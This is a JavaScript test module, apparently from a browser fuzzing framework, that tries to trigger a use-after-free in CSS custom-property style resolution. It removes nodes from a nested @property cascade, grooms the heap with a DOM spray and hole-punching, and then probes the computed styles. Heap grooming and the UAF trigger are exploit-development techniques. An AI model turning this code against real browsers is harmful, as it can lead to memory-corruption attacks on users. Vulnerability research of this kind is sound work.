import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CSS_CUSTOM_PROPERTY_UAF',
    category: 'Rendering',
    risk:     'HIGH',
    description:
        'Cascata CSS de 5 níveis com dependências cruzadas + @property Houdini. ' +
        'offsetWidth forçado entre remoções cria multiple GC cycles do StyleResolver. ' +
        'Testa remoção pai→filho e filho→pai para atingir ambos os caminhos C++.',

    setup: function() {
        this.style = document.createElement('style');
        this.style.textContent = `
            @property --fuzz-base { syntax: '<length>'; initial-value: 10px; inherits: true; }
            @property --fuzz-mult { syntax: '<number>'; initial-value: 1; inherits: false; }
            .fuzz-l0 { --fuzz-base: 20px; --fuzz-mult: 2; }
            .fuzz-l1 { --fuzz-l1-w: calc(var(--fuzz-base) * var(--fuzz-mult)); }
            .fuzz-l2 { --fuzz-l2-w: calc(var(--fuzz-l1-w, 0px) + 5px); }
            .fuzz-l3 { --fuzz-l3-w: calc(var(--fuzz-l2-w, 0px) * 1.5); }
            .fuzz-l4 { width: var(--fuzz-l3-w, 10px); }
        `;
        document.head.appendChild(this.style);

        this.levels = [];
        let parent = document.body;
        for (let i = 0; i < 5; i++) {
            const el = document.createElement('div');
            el.className = `fuzz-l${i}`;
            parent.appendChild(el);
            this.levels.push(el);
            parent = el;
        }

        this.levels.forEach(el => void el.getBoundingClientRect());
        this.initialComputedWidths = this.levels.map(el => getComputedStyle(el).width);

        // 🚨 Oráculo: Registramos o nível 0 (raiz da cascata)
        if (GCOracle.registry) GCOracle.registry.register(this.levels[0], `${this.id}_target`);
    },

    trigger: function() {
        this.levels[0].remove();
        
        // 🚨 Grooming: Esburaca o heap após a morte do nó pai
        let nodes = Groomer.sprayDOM('div', 300);
        Groomer.punchHoles(nodes, 2);

        try { void this.levels[4].offsetWidth; } catch(e) {}

        try {
            this.levels[1].style.setProperty('--fuzz-base', '999px');
            void this.levels[4].offsetWidth;
        } catch(e) {}

        this.levels[4].remove();
        try { void this.levels[1].offsetWidth; } catch(e) {}
    },

    probe: [
        s => getComputedStyle(s.levels[0]).width,
        s => getComputedStyle(s.levels[1]).width,
        s => getComputedStyle(s.levels[4]).width,
        s => getComputedStyle(s.levels[1]).getPropertyValue('--fuzz-base').trim(),
        s => { try { return s.levels[1].offsetWidth; } catch(e) { return e.constructor.name; } },
        s => { try { return s.levels[2].getBoundingClientRect().width; } catch(e) { return e.constructor.name; } },
        s => s.initialComputedWidths[4],
        s => getComputedStyle(s.levels[3]).width === s.initialComputedWidths[3] ? 'unchanged' : 'CHANGED',
    ],

    cleanup: function() {
        try { this.levels.forEach(el => el.remove()); } catch(e) {}
        try { this.style.remove(); } catch(e) {}
        this.levels = null;
    }
};
